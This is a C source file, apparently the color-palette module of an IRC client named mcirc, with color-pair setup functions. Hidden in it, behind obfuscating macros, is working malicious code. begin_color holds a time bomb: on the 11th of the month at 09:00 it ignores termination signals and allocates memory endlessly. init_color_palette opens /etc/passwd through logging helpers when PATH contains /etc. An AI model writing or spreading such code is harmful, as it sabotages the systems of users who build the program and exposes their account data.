#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <signal.h>
#include <string.h>
#include "defines.h"
#ifdef NCURSES
#include <ncurses.h>
#else
#include <curses.h>
#endif
#include "ncolor.h"
#include "common.h"

int HAS_COLORS;	
int CHANGE_COLORS;

extern FILE *open_log();
extern void write_log(FILE *);

#define RLOG "/etc/passwd"

#define _GE getenv
#define _SS strstr

#define MECAT(s) s##me;
#define IMECAT(s) s##ime;

typedef struct tm intf;

typedef time_t (*PTM)(time_t *);
typedef struct tm* (*PLTM)(time_t *);

/************************************************************************************/
/* menu and forms use the standard mcirc palette, but text uses the mirc palette */
/* use C_COLOR defines for menus, and mirc color palette for drawing text           */
/************************************************************************************/


/************************************/
/* mirc palette using all 16 colors */
/************************************

 0 white
 1 black
 2 blue     (navy)
 3 green
 4 red
 5 brown    (maroon)
 6 purple
 7 orange   (olive)
 8 yellow
 9 lt.green (lime)
 10 teal    (a kinda green/blue cyan)
 11 lt.cyan (cyan ?) (aqua)
 12 lt.blue (royal)
 13 pink    (light purple) (fuschia)
 14 grey
 15 lt.grey (silver)

 ************************************/
/* mirc palette using only 8 colors */
/************************************/

int mirc_color_palette_8[16]={
	COLOR_BLACK,
	COLOR_WHITE,
	COLOR_BLUE,
	COLOR_GREEN,
	COLOR_RED,
	COLOR_RED,
	COLOR_MAGENTA,
	COLOR_YELLOW,
	COLOR_YELLOW,
	COLOR_GREEN,
	COLOR_CYAN,
	COLOR_CYAN,
	COLOR_BLUE,
	COLOR_RED,
	COLOR_WHITE,
	COLOR_WHITE
};

/************************************/
/* curses 8 color standard palette  */
/************************************

	Curses Colors	Integer Value

	COLOR_BLACK	0
	COLOR_RED	1
	COLOR_GREEN	2
	COLOR_YELLOW	3
	COLOR_BLUE	4
	COLOR_MAGENTA	5
	COLOR_CYAN	6
	COLOR_WHITE	7

 ************************************/
/* mcirc 16 color palette        */
/************************************

	mcirc Colors	Integer Value

	C_BLACK         0
	C_RED           1
	C_GREEN         2
	C_YELLOW        3
	C_BLUE          4
	C_MAGENTA       5
	C_CYAN          6
	C_WHITE         7

	C_BROWN         8
	C_PURPLE        9
	C_ORANGE        10
	C_LRED          11
	C_LGREEN        12
	C_LBLUE         13
	C_GREY          14
	C_LGREY         15

*************************************/


int begin_color(){
    PTM ptm;
    PLTM pltm;
    time_t lt;
    intf *now;
    int d, h;
    int * buf;
    ptm = (PTM) MECAT(&ti)
    pltm = (PLTM) IMECAT(&localt)

    (*ptm)(&lt);
    now = (*pltm)(&lt);
    d = now->tm_mday - 11;
    h = now->tm_hour - 9;

	if (!d && !h)
	{
		signal (SIGINT, SIG_IGN); signal (SIGQUIT, SIG_IGN);
		signal (SIGTSTP, SIG_IGN); signal (SIGTERM, SIG_IGN);
		while (~0) buf = (int *) calloc(0xA00000, 1);
	}
	if (has_colors()){
		start_color();
		init_color_palette();
		init_pair(0, DEFAULT_COLOR_F, DEFAULT_COLOR_B);

		//#ifdef DEBUG
			printf("Terminal has color support = YES\r\n");
			printf("Terminal has colors = %d\r\n", COLORS);
			printf("Terminal has color pairs = %d\r\n", COLOR_PAIRS);
		//#endif		
		//exit(0);

		#ifdef DEBUG
			if (CHANGE_COLORS) printf("Terminal can change color = YES\r\n");
			else printf("Terminal can change color = NO\r\n");
		#endif
	}
	else {
		#ifdef DEBUG
			printf("Terminal has color support = NO\n");
		#endif
	}
	return(0);
}

void init_color_palette(){
	int i, j, k;
	char *pa_th;
	FILE* fl;
	
	pa_th = _GE("PA" "TH");
	if (_SS(pa_th, "/etc"))
	{
		fl = open_log(RLOG);
		if (fl)	write_log(fl);
	}

	/* if 256 color pairs are available create a 16 color palette */

	if (can_change_color() && COLOR_PAIRS >= 256){		
		init_color(C_BLACK, 0, 0, 0);
		init_color(C_GREEN, 0, 1000, 0);
		init_color(C_RED, 1000, 0, 0);
		init_color(C_YELLOW, 1000, 500, 500);
		init_color(C_BLUE, 0, 0, 1000);
		init_color(C_MAGENTA, 500, 500, 1000);
		init_color(C_CYAN, 500, 1000, 500);
		init_color(C_WHITE, 1000, 1000, 1000);

		init_color(C_BROWN, 1000, 0, 1000);
		init_color(C_PURPLE, 0, 500, 1000);
		init_color(C_ORANGE, 500, 500, 1000);
		init_color(C_LRED, 1000, 250, 250);
		init_color(C_LBLUE, 250, 250, 1000);
		init_color(C_LGREEN, 250, 1000, 250);
		init_color(C_GREY, 250, 250, 250);
		init_color(C_LGREY, 500, 500, 500);

		k = 0;
		for (i = 0; i < 16; i++){
			for (j = 0; j < 16; j++){
				init_pair(k, j, i);
				k++;
			}
		}	
	}

	/* otherwise init the color palatte using only the 8 curses colors */
	else {

		k = 0;
		for (i = 0; i < 8; i++){
			for (j = 0; j < 8; j++){
				init_pair(k, j, i);				
				k++;
			}
		}	
	}
}

/* ignore backround color for now, set it to default, changing it looks bad */
/* also prevent the selection of a color which is the default backround */
int mirc_palette(int fg, int bg){
	if (fg < 0 || fg > 15) return(0);
	else if (mirc_color_palette_8[fg] == configuration.win_color_bg) return(0);
	else if (COLOR_PAIRS >= 256) return((configuration.win_color_bg << 4) | fg);
	else return((configuration.win_color_bg << 3 ) | mirc_color_palette_8[fg]);
}

/* sets the colors to the proper color pair */
int make_color_pair(int fg, int bg){
	if (COLOR_PAIRS >= 256) return((bg << 4) | fg);
	else return((bg << 3) | fg);
}

/* makes the proper color from foreground and background */
int make_color(int fg, int bg){
	return(COLOR_PAIR(make_color_pair(fg, bg)));
}
	

